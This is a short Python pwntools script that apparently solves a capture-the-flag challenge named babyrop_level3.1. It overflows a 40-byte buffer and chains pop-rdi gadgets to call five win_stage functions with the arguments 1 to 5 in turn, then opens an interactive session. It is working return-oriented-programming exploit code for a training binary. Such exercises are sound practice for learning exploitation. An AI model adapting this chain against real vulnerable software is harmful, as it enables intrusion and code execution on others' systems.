from pwn import *

elf = ELF('/challenge/babyrop_level3.1')
rop = ROP(elf)
pop_rdi = rop.rdi.address

rop.raw(p64(pop_rdi))
rop.raw(p64(1))
rop.raw(p64(elf.sym.win_stage_1))

rop.raw(p64(pop_rdi))
rop.raw(p64(2))
rop.raw(p64(elf.sym.win_stage_2))

rop.raw(p64(pop_rdi))
rop.raw(p64(3))
rop.raw(p64(elf.sym.win_stage_3))

rop.raw(p64(pop_rdi))
rop.raw(p64(4))
rop.raw(p64(elf.sym.win_stage_4))

rop.raw(p64(pop_rdi))
rop.raw(p64(5))
rop.raw(p64(elf.sym.win_stage_5))


print(rop.dump())
offset_ret = 40
payload = b'A' * (offset_ret) + rop.chain()

proc = process('/challenge/babyrop_level3.1')
proc.recv()
proc.send(payload)
proc.interactive()
